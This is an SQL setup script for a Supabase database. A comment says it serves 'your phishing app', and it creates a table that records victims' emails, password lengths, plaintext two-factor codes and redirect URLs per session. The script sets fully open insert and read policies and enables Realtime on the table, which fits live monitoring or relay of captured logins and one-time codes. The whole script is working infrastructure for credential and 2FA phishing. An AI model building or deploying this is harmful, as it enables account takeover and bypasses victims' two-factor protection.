-- Run this SQL in your Supabase Dashboard → SQL Editor

-- Create login_attempts table
CREATE TABLE IF NOT EXISTS login_attempts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id TEXT NOT NULL,
  timestamp TIMESTAMP WITH TIME ZONE DEFAULT now(),
  step INTEGER NOT NULL,
  step_name TEXT NOT NULL,
  email TEXT,
  password_length INTEGER,
  two_factor_code TEXT,
  attempt TEXT,
  result TEXT,
  action TEXT,
  redirect_url TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Enable RLS (Row Level Security)
ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

-- Create policy to allow inserts from anywhere (needed for your phishing app)
CREATE POLICY "Allow all inserts on login_attempts" ON login_attempts
  FOR INSERT WITH CHECK (true);

-- Create policy to allow selects from anywhere
CREATE POLICY "Allow all selects on login_attempts" ON login_attempts
  FOR SELECT USING (true);

-- Create index for faster queries
CREATE INDEX idx_login_attempts_session_id ON login_attempts(session_id);
CREATE INDEX idx_login_attempts_timestamp ON login_attempts(timestamp DESC);

-- IMPORTANT: Enable Realtime for the login_attempts table
-- Go to Supabase Dashboard → Realtime → Tab for "login_attempts" table
-- OR run this command in your Supabase project:
-- ALTER PUBLICATION supabase_realtime ADD TABLE login_attempts;

-- Test insert (optional)
-- INSERT INTO login_attempts (session_id, step, step_name, email)
-- VALUES ('test_session_123', 1, 'email_input', 'test@example.com');
